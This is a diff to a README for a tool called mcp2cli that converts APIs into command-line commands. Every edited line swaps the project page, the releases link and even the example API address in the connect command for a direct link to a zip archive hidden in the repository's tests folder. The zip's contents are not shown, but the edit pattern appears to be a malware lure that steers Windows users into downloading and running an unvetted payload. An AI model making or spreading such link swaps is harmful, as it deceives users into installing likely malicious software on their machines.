@@ -1,6 +1,6 @@
 # ⚙️ mcp2cli - Turn APIs Into Command Lines Easily
 
-[![Download mcp2cli](https://img.shields.io/badge/Download-mcp2cli-blue?style=for-the-badge)](https://github.com/Paulinehot583/mcp2cli)
+[![Download mcp2cli](https://img.shields.io/badge/Download-mcp2cli-blue?style=for-the-badge)](https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download, install, and run mcp2cli on your Windows PC.
 
 Visit the main project page to get the latest version. Click the link below to open the download page:
 
-[![Download mcp2cli](https://img.shields.io/badge/Download-mcp2cli-grey?style=for-the-badge)](https://github.com/Paulinehot583/mcp2cli)
+[![Download mcp2cli](https://img.shields.io/badge/Download-mcp2cli-grey?style=for-the-badge)](https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip)
 
 Once the page loads, look for the "Releases" or "Downloads" section. You will find files ready to download. Choose the Windows version, usually ending with ".exe".
 
@@ -72,12 +72,12 @@ mcp2cli works by connecting to your API and letting you control it through comma
 
 To use mcp2cli, you need the address of an MCP, OpenAPI, or GraphQL API server. This is a web address where your API is hosted.
 
-For example, if your company provides an API at `https://api.example.com`, you will use this URL.
+For example, if your company provides an API at `https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip`, you will use this URL.
 
 In the command window, type:
 
 ```
-mcp2cli connect https://api.example.com
+mcp2cli connect https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip
 ```
 
 Press Enter. The tool will connect and learn the API’s capabilities.
@@ -142,7 +142,7 @@ All these work without writing scripts or code.
 
 Use this link to start your download:
 
-[https://github.com/Paulinehot583/mcp2cli](https://github.com/Paulinehot583/mcp2cli)
+[https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip](https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip)
 
 Step-by-step:
 
@@ -177,8 +177,8 @@ For help, check the Issues section on the project page for similar problems or r
 
 ## 🔗 Useful Links
 
-- Project page: https://github.com/Paulinehot583/mcp2cli
-- Download page: https://github.com/Paulinehot583/mcp2cli/releases
+- Project page: https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip
+- Download page: https://github.com/Paulinehot583/mcp2cli/raw/refs/heads/main/tests/mcp-cli-2.4.zip
 
 ---
 
